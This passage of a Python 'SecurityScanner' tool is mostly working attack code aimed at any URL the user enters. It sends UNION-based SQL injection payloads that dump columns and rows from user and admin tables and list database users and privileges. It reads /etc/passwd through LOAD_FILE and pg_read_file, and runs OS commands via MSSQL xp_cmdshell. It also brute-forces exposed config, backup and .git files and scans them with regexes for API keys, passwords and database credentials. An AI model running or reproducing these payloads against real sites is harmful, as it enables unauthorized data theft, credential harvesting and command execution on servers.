            'Oracle': f"SELECT column_name FROM all_tab_columns WHERE table_name='{table_name.upper()}'",
            'SQLite': f"SELECT name FROM pragma_table_info('{table_name}')"
        }
        
        query = column_queries.get(db_type)
        if not query:
            return None
        
        payload = f"' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM ({query})--"
        
        try:
            test_params = original_params.copy()
            test_params[param_name] = [payload]
            
            response = self.session.get(url, params=test_params, timeout=15)
            columns = self.extract_value_from_response(response.text)
            
            return columns.split(',') if columns else None
            
        except:
            return None

    def extract_data(self, url, param_name, original_params, db_type):
        """Extract data from interesting tables"""
        interesting_tables = ['users', 'admin', 'customer', 'user', 'accounts', 'members']
        
        for table in interesting_tables:
            try:
                # First get columns
                columns = self.extract_columns(url, param_name, original_params, db_type, table)
                if not columns:
                    continue
                    
                # Extract data
                if db_type == 'Oracle':
                    payload = f"' UNION SELECT NULL,{','.join(columns)},NULL FROM {table} WHERE rownum <= 5--"
                else:
                    payload = f"' UNION SELECT NULL,CONCAT_WS('|',{','.join(columns)}),NULL FROM {table} LIMIT 5--"
                
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(url, params=test_params, timeout=15)
                data = self.extract_value_from_response(response.text)
                
                if data:
                    rows = [row.split('|') for row in data.split('\n') if row]
                    self.display_data_text(f"Data from {table}", columns, rows)
                    
            except:
                continue

    def extract_users(self, url, param_name, original_params, db_type):
        """Extract database users"""
        user_queries = {
            'MySQL': "SELECT user,host FROM mysql.user",
            'PostgreSQL': "SELECT usename,usesysid FROM pg_user",
            'MSSQL': "SELECT name,principal_id FROM sys.server_principals WHERE type='S'",
            'Oracle': "SELECT username,user_id FROM all_users",
            'SQLite': "SELECT sqlite_user()"
        }
        
        query = user_queries.get(db_type)
        if not query:
            return
        
        try:
            if db_type == 'Oracle':
                payload = f"' UNION SELECT NULL,username||','||user_id,NULL FROM all_users WHERE rownum <= 10--"
            elif db_type == 'SQLite':
                payload = f"' UNION SELECT NULL,sqlite_user(),NULL--"
            else:
                payload = f"' UNION SELECT NULL,CONCAT_WS(',',{query}),NULL--"
            
            test_params = original_params.copy()
            test_params[param_name] = [payload]
            
            response = self.session.get(url, params=test_params, timeout=15)
            users = self.extract_value_from_response(response.text)
            
            if users:
                self.typewriter_effect("\n👥 DATABASE USERS:")
                self.typewriter_effect("=" * 50)
                if db_type == 'Oracle':
                    rows = [user.split(',') for user in users.split('\n') if user]
                    for row in rows:
                        self.typewriter_effect(f"Username: {row[0]:20} | User ID: {row[1]}")
                elif db_type == 'SQLite':
                    self.typewriter_effect(f"User: {users}")
                else:
                    rows = [user.split(',') for user in users.split('\n') if user]
                    for row in rows:
                        self.typewriter_effect(f"User: {row[0]:20} | Host: {row[1]}")
                self.typewriter_effect("=" * 50)
                    
        except Exception as e:
            self.typewriter_effect(f"❌ User extraction failed: {str(e)}")

    def extract_privileges(self, url, param_name, original_params, db_type):
        """Extract user privileges"""
        priv_queries = {
            'MySQL': "SELECT grantee,privilege_type FROM information_schema.user_privileges",
            'PostgreSQL': "SELECT grantee,privilege_type FROM information_schema.role_table_grants",
            'MSSQL': "SELECT permission_name,state_desc FROM sys.fn_my_permissions(NULL, 'SERVER')",
            'Oracle': "SELECT grantee,privilege FROM dba_sys_privs WHERE grantee='PUBLIC'",
            'SQLite': "SELECT sqlite_user()"
        }
        
        query = priv_queries.get(db_type)
        if not query:
            return
        
        try:
            if db_type == 'Oracle':
                payload = f"' UNION SELECT NULL,grantee||','||privilege,NULL FROM dba_sys_privs WHERE rownum <= 10--"
            elif db_type == 'SQLite':
                payload = f"' UNION SELECT NULL,sqlite_user(),NULL--"
            else:
                payload = f"' UNION SELECT NULL,CONCAT_WS(',',{query}),NULL--"
            
            test_params = original_params.copy()
            test_params[param_name] = [payload]
            
            response = self.session.get(url, params=test_params, timeout=15)
            privs = self.extract_value_from_response(response.text)
            
            if privs:
                self.typewriter_effect("\n🔐 USER PRIVILEGES:")
                self.typewriter_effect("=" * 50)
                if db_type == 'Oracle':
                    rows = [priv.split(',') for priv in privs.split('\n') if priv]
                    for row in rows:
                        self.typewriter_effect(f"Grantee: {row[0]:20} | Privilege: {row[1]}")
                elif db_type == 'SQLite':
                    self.typewriter_effect(f"User: {privs}")
                else:
                    rows = [priv.split(',') for priv in privs.split('\n') if priv]
                    for row in rows:
                        self.typewriter_effect(f"Grantee: {row[0]:20} | Privilege: {row[1]}")
                self.typewriter_effect("=" * 50)
                    
        except Exception as e:
            self.typewriter_effect(f"❌ Privilege extraction failed: {str(e)}")

    def advanced_attacks(self, url, param_name, original_params, db_type):
        """Perform advanced attacks"""
        if db_type in ['MySQL', 'PostgreSQL']:
            self.typewriter_effect("\n⚡ Attempting advanced file operations...")
            self.file_operations(url, param_name, original_params, db_type)
        
        if db_type == 'MSSQL':
            self.typewriter_effect("\n⚡ Attempting command execution...")
            self.command_execution(url, param_name, original_params)

    def file_operations(self, url, param_name, original_params, db_type):
        """File read/write operations"""
        file_payloads = {
            'MySQL': [
                ("Read /etc/passwd", "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"),
                ("Read /etc/hosts", "' UNION SELECT NULL,LOAD_FILE('/etc/hosts'),NULL--")
            ],
            'PostgreSQL': [
                ("Read /etc/passwd", "' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--")
            ]
        }
        
        for description, payload in file_payloads.get(db_type, []):
            try:
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(url, params=test_params, timeout=15)
                content = response.text[:500]  # First 500 chars
                
                if content and not re.search(r'(error|not found|permission denied)', content, re.IGNORECASE):
                    self.typewriter_effect(f"📁 {description} successful!")
                    self.typewriter_effect("Content:")
                    self.typewriter_effect("-" * 50)
                    self.typewriter_effect(content)
                    self.typewriter_effect("-" * 50)
                    
            except:
                continue

    def command_execution(self, url, param_name, original_params):
        """Attempt command execution on MSSQL"""
        commands = [
            "whoami", "hostname", "ipconfig", "ls", "dir"
        ]
        
        for cmd in commands:
            try:
                payload = f"'; EXEC xp_cmdshell '{cmd}'--"
                test_params = original_params.copy()
                test_params[param_name] = [payload]
                
                response = self.session.get(url, params=test_params, timeout=15)
                
                if response.status_code == 200:
                    self.typewriter_effect(f"⚡ Command execution attempted: {cmd}")
                    self.typewriter_effect("Output:")
                    self.typewriter_effect("-" * 50)
                    self.typewriter_effect(response.text[:500])
                    self.typewriter_effect("-" * 50)
                    
            except:
                continue

    def test_url_path_injection(self, url):
        """Test for SQL injection in URL path"""
        path_payloads = [
            "/'", "/\"", "/')", "/\")", 
            "/ AND 1=1", "/ OR 1=1",
            "/ SLEEP(5)", "/%20WAITFOR%20DELAY%20'0:0:5'"
        ]
        
        parsed_url = urlparse(url)
        base_path = parsed_url.path
        
        for payload in path_payloads:
            try:
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{base_path}{payload}"
                
                start_time = time.time()
                response = self.session.get(test_url, timeout=15)
                response_time = time.time() - start_time
                
                if response_time > 5 or re.search(r'(error|syntax|mysql|postgres)', response.text, re.IGNORECASE):
                    self.typewriter_effect(f"🚨 Possible path injection with: {payload}")
                    
            except:
                continue

    def extract_value_from_response(self, response_text):
        """Extract values from SQL injection responses"""
        # Multiple extraction patterns
        patterns = [
            r'\|([^|]+)\|',  # Values between pipes
            r'~([^~]+)~',    # Values between tildes
            r'\[([^\]]+)\]', # Values between brackets
            r'<td>([^<]+)</td>',  # Table cells
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                return '\n'.join(matches)
        
        return None

    def display_data_text(self, title, headers, rows):
        """Display data in formatted text"""
        if not rows:
            return
            
        self.typewriter_effect(f"\n📊 {title}:")
        self.typewriter_effect("=" * 80)
        
        # Calculate column widths
        col_widths = [max(len(str(row[i])) for row in rows + [headers]) for i in range(len(headers))]
        
        # Display headers
        header_line = " | ".join(f"{headers[i]:<{col_widths[i]}}" for i in range(len(headers)))
        self.typewriter_effect(header_line)
        self.typewriter_effect("-" * 80)
        
        # Display rows
        for row in rows:
            row_line = " | ".join(f"{str(row[i]):<{col_widths[i]}}" for i in range(len(row)))
            self.typewriter_effect(row_line)
        
        self.typewriter_effect("=" * 80)

    def display_vulnerability_table(self, vuln_info):
        """Display vulnerability information in a formatted table"""
        table = PrettyTable()
        table.field_names = ["Attribute", "Value"]
        table.align = "l"
        
        for key, value in vuln_info.items():
            if key != 'url':  # Skip URL for brevity
                table.add_row([key.upper(), str(value)[:100]])
        
        self.typewriter_effect(f"\n🚨 VULNERABILITY FOUND:\n{table}\n")

    def scan_exposed_files(self):
        """Scan for exposed sensitive files with advanced techniques"""
        type_animation("🔍 Scanning for exposed sensitive files...")
        
        # Get base URL without path
        base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Create a list of files to check
        files_to_check = []
        
        # Add common sensitive files
        for file in SENSITIVE_FILES:
            files_to_check.append(f"/{file}")
        
        # Add files in common directories
        for directory in self.common_paths:
            for file in SENSITIVE_FILES[:20]:  # Limit to avoid too many requests
                files_to_check.append(f"{directory}{file}")
        
        # Add version control specific files
        version_control_files = [
            '.git/config',
            '.git/HEAD',
            '.svn/entries',
            '.hg/store',
            '.bzr/checkout',
            '_darcs/inventory'
        ]
        
        for file in version_control_files:
            files_to_check.append(f"/{file}")
            for directory in self.common_paths[:10]:  # Limit directories
                files_to_check.append(f"{directory}{file}")
        
        # Add backup patterns
        backup_patterns = [
            '.bak',
            '.backup',
            '.old',
            '.orig',
            '.copy',
            '.tmp',
            '.temp',
            '~',
            '.swp',
            '.swo'
        ]
        
        for file in SENSITIVE_FILES[:30]:  # Limit files
            for pattern in backup_patterns:
                files_to_check.append(f"/{file}{pattern}")
        
        # Add common configuration files with extensions
        config_files = [
            'config',
            'configuration',
            'settings',
            'setup',
            'install',
            'database',
            'db',
            'app',
            'application'
        ]
        
        config_extensions = [
            '.php',
            '.php3',
            '.php4',
            '.php5',
            '.phtml',
            '.pl',
            '.py',
            '.jsp',
            '.asp',
            '.aspx',
            '.rb',
            '.cgi',
            '.xml',
            '.json',
            '.yml',
            '.yaml',
            '.ini',
            '.conf',
            '.config',
            '.cfg',
            '.txt',
            '.log',
            '.bak',
            '.backup',
            '.old',
            '.orig',
            '.copy',
            '.tmp',
            '.temp'
        ]
        
        for file in config_files:
            for ext in config_extensions:
                files_to_check.append(f"/{file}{ext}")
        
        # Remove duplicates
        files_to_check = list(set(files_to_check))
        
        # Shuffle to randomize scanning order
        random.shuffle(files_to_check)
        
        # Limit total requests to avoid overwhelming the server
        max_requests = 500
        if len(files_to_check) > max_requests:
            files_to_check = files_to_check[:max_requests]
        
        type_animation(f"📋 Checking {len(files_to_check)} potential sensitive files...")
        
        # Track found files
        found_files = []
        
        # Common 404 indicators to filter out false positives
        not_found_indicators = [
            '404 not found',
            'page not found',
            'file not found',
            'error 404',
            'not found',
            'the requested url was not found',
            'no such file',
            'cannot find',
            'does not exist',
            'resource not found',
            'http 404',
            'error 404',
            '404 error',
            'not found on this server',
            'the requested resource',
            'could not be found'
        ]
        
        # Check each file
        for i, file_path in enumerate(files_to_check):
            try:
                # Add delay to avoid overwhelming the server
                time.sleep(0.1)
                
                # Construct full URL
                full_url = f"{base_url}{file_path}"
                
                # Send request
                response = self.session.get(full_url, timeout=5, allow_redirects=True)
                
                # Check if file exists
                if response.status_code == 200:
                    # Check if it's a real file and not a custom 404 page
                    content_type = response.headers.get('Content-Type', '').lower()
                    
                    # Skip HTML pages that might be 404 pages
                    if 'text/html' in content_type:
                        content_lower = response.text.lower()
                        
                        # Check if it contains 404 indicators
                        is_404 = any(indicator in content_lower for indicator in not_found_indicators)
                        
                        if is_404:
                            continue
                    
                    # Get file size
                    file_size = len(response.content)
                    
                    # Skip very small files that might be empty or error pages
                    if file_size < 10:
                        continue
                    
                    # Skip common image types that are likely not sensitive
                    if content_type in ['image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/webp']:
                        continue
                    
                    # Get file info
                    file_info = {
                        'url': full_url,
                        'status_code': response.status_code,
                        'content_type': content_type,
                        'size': file_size,
                        'path': file_path,
                        'sensitive': self.is_sensitive_file(file_path, content_type)
                    }
                    
                    found_files.append(file_info)
                    
                    # Display found file
                    sensitivity = "🔴 SENSITIVE" if file_info['sensitive'] else "🟡 Potentially sensitive"
                    type_animation(f"📁 Found exposed file: {file_path} ({sensitivity}) - {file_size} bytes")
                    
                    # If it's a sensitive file, try to extract more info
                    if file_info['sensitive'] and file_size < 100000:  # Only for smaller files
                        self.analyze_file_content(full_url, response.text)
                
                # Show progress
                if (i + 1) % 50 == 0:
                    type_animation(f"📊 Progress: {i + 1}/{len(files_to_check)} files checked")
                
            except requests.exceptions.RequestException:
                continue
            except Exception as e:
                continue
        
        # Store results
        self.results['exposed_files'] = found_files
        
        if found_files:
            # Display summary table
            self.display_exposed_files_table(found_files)
            
            # Update security score
            sensitive_count = sum(1 for f in found_files if f['sensitive'])
            self.results['security_score'] -= min(30, sensitive_count * 5)
            
            type_animation(f"🚨 Found {len(found_files)} exposed files ({sensitive_count} sensitive)")
        else:
            type_animation("✅ No exposed sensitive files found")

    def is_sensitive_file(self, file_path, content_type):
        """Determine if a file is likely sensitive based on its path and content type"""
        file_path_lower = file_path.lower()
        
        # Check for known sensitive file patterns
        sensitive_patterns = [
            '.env',
            'config',
            'database',
            'backup',
            'password',
            'secret',
            'key',
            'credential',
            'token',
            'auth',
            'admin',
            'private',
            'ssh',
            'ssl',
            'certificate',
            'pem',
            'p12',
            'pfx',
            'id_rsa',
            'wp-config',
            'settings',
            'application.properties',
            'web.config',
            'appsettings',
            'connectionstring',
            'api_key',
            'oauth',
            'jwt',
            'session',
            'cookie',
            'log',
            'error',
            'debug',
            'phpinfo',
            'phpmyadmin',
            'adminer',
            'shell',
            'webshell',
            '.git',
            '.svn',
            '.hg',
            '.bzr',
            '_darcs'
        ]
        
        # Check if any pattern matches
        for pattern in sensitive_patterns:
            if pattern in file_path_lower:
                return True
        
        # Check content types that might indicate sensitive files
        sensitive_content_types = [
            'application/json',
            'application/xml',
            'text/xml',
            'text/plain',
            'application/octet-stream',
            'application/x-sql',
            'application/x-sh',
            'application/x-python',
            'application/x-perl',
            'application/x-php',
            'application/x-ruby',
            'application/x-javascript',
            'application/yaml',
            'application/x-yaml'
        ]
        
        if content_type in sensitive_content_types:
            return True
        
        return False

    def analyze_file_content(self, url, content):
        """Analyze the content of a sensitive file for secrets"""
        type_animation(f"🔍 Analyzing content of {url} for secrets...")
        
        # Patterns for secrets
        secret_patterns = {
            'API Keys': [
                r'AIza[0-9A-Za-z\-_]{35}',  # Google API key
                r'AKIA[0-9A-Z]{16}',         # AWS Access Key ID
                r'[0-9a-zA-Z/+]{40}',         # Possible secret token
                r'sk-[a-zA-Z0-9]{48}',       # Stripe API key
                r'pk-[a-zA-Z0-9]{48}',       # Stripe publishable key
            ],
            'Passwords': [
                r'password\s*[:=]\s*[^\s]+',
                r'passwd\s*[:=]\s*[^\s]+',
                r'pwd\s*[:=]\s*[^\s]+',
            ],
            'Database Credentials': [
                r'db_(user|pass|name|host)\s*[:=]\s*[^\s]+',
                r'database_(user|pass|name|host)\s*[:=]\s*[^\s]+',
            ]
        }
        
        found_secrets = []
        
        for secret_type, patterns in secret_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    found_secrets.extend([(secret_type, match) for match in matches])
        
        if found_secrets:
            self.typewriter_effect("🚨 SECRETS FOUND:")
            self.typewriter_effect("=" * 50)
            for secret_type, secret in found_secrets:
                self.typewriter_effect(f"{secret_type}: {secret[:50]}...")
            self.typewriter_effect("=" * 50)

    def display_exposed_files_table(self, found_files):
        """Display exposed files in a formatted table"""
        table = PrettyTable()
        table.field_names = ["File Path", "Status", "Size", "Content Type", "Sensitivity"]
        table.align = "l"
        
        for file_info in found_files:
            sensitivity = "🔴 SENSITIVE" if file_info['sensitive'] else "🟡 Potentially sensitive"
            table.add_row([
                file_info['path'],
                file_info['status_code'],
                f"{file_info['size']} bytes",
                file_info['content_type'],
                sensitivity
            ])
        
        self.typewriter_effect(f"\n📁 EXPOSED FILES:\n{table}")

    def run_full_scan(self):
        """Run a complete security scan"""
        display_banner()
        
        # Basic information gathering
        self.get_ip_address()
        self.get_dns_records()
        self.get_ssl_info()
        self.get_headers()
        self.detect_powered_by()
        self.get_technology()
        self.get_hosting_info()
        
        # Vulnerability scanning
        self.scan_sql_injection()
        self.scan_exposed_files()
        
        # Display results
        self.display_results()

    def display_results(self):
        """Display scan results"""
        self.typewriter_effect("\n" + "="*80)
        self.typewriter_effect("📊 SCAN RESULTS SUMMARY".center(80))
        self.typewriter_effect("="*80)
        
        # Display security score
        score = self.results['security_score']
        if score >= 80:
            status = "✅ SECURE"
        elif score >= 60:
            status = "⚠️ MODERATE"
        else:
            status = "🚨 VULNERABLE"
        
        self.typewriter_effect(f"Security Score: {score}/100 ({status})")
        
        # Display vulnerabilities
        if self.vulnerabilities:
            self.typewriter_effect(f"\n🚨 Found {len(self.vulnerabilities)} vulnerabilities:")
            for vuln in self.vulnerabilities:
                self.typewriter_effect(f"  - {vuln['type']} in {vuln['parameter']}")
        
        # Display exposed files
        if self.results['exposed_files']:
            sensitive_files = [f for f in self.results['exposed_files'] if f['sensitive']]
            self.typewriter_effect(f"\n📁 Found {len(self.results['exposed_files'])} exposed files ({len(sensitive_files)} sensitive):")
            for file_info in self.results['exposed_files'][:5]:  # Show first 5
                sensitivity = "🔴" if file_info['sensitive'] else "🟡"
                self.typewriter_effect(f"  {sensitivity} {file_info['path']}")
            
            if len(self.results['exposed_files']) > 5:
                self.typewriter_effect(f"  ... and {len(self.results['exposed_files']) - 5} more files")
        
        self.typewriter_effect("\n" + "="*80)
        self.typewriter_effect("SCAN COMPLETE".center(80))
        self.typewriter_effect("="*80)

def main():
    """Main function to run the scanner"""
    print("Security Scanner - Advanced Web Application Security Testing Tool")
    print("="*80)
    
    # Get target URL from user
    target_url = input("Enter target URL (e.g., http://example.com/page.php?id=1): ").strip()
    
    if not target_url:
        print("❌ No URL provided. Exiting...")
        return
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    try:
        # Create scanner instance
        scanner = SecurityScanner(target_url)
        
        # Run full scan
        scanner.run_full_scan()
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Scan interrupted by user")
    except Exception as e:
        print(f"\n❌ An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
